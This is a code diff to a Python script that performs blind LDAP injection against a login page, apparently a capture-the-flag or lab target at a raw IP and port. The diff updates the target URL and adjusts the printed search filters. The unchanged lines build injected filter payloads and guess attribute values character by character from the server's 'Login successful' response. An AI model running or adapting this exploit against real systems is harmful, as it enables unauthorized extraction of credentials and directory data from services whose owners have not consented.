@@ -18,7 +18,7 @@ index = 0
 index_injection = 0
 success = ""
 
-url = "http://94.237.54.190:33599/index.php"
+url = "http://94.237.53.146:37074/index.php"
 
 while True:
 
@@ -30,7 +30,7 @@ while True:
     payload1 = f"{username})(|({attribute}={injection_payload}{char_list[index]}*"
     data1 = {'username': payload1, 'password': password + ')'}
     response = requests.post(url, data=data1, proxies=proxies)
-    print(f"Trying (&{username})(|({attribute}={injection_payload}{char_list[index]}*)))")
+    print(f"Trying (&(uid={username})(|({attribute}={injection_payload}{char_list[index]}*)(password={password})))")
     
     
     if "Login successful" not in response.text:
@@ -40,7 +40,7 @@ while True:
 
         print(f"Added successfully (&{username})(|({attribute}={injection_payload}{char_list[index]}*)))")
         payload_list.append(char_list[index])
-        success = f"Search filter: (&{username})(|({attribute}=" + "\033[1m" + ''.join(payload_list) + "\033[0m" + "*)))"
+        success = f"Search filter: (&(uid={username})(|({attribute}=" + "\033[1m" + ''.join(payload_list) + "\033[0m" + f"*)(password={password})))"
         print(success)
         index = 0
 
